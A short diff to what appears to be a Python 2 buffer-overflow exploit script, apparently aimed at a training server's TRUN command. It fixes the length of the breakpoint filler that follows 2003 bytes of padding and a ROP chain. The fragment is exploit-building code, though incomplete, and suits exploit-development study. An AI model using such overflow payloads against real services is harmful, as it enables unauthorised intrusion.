@@ -266,7 +266,7 @@ def main():
     buffer = "TRUN /.:/"
     buffer += "A"*2003
     buffer += rop_chain
-    buffer += "\xCC"*(3500-2003-4)
+    buffer += "\xCC"*(3500-2003-len(rop_chain))
 
     try:
         print "[+] Connecting to target"
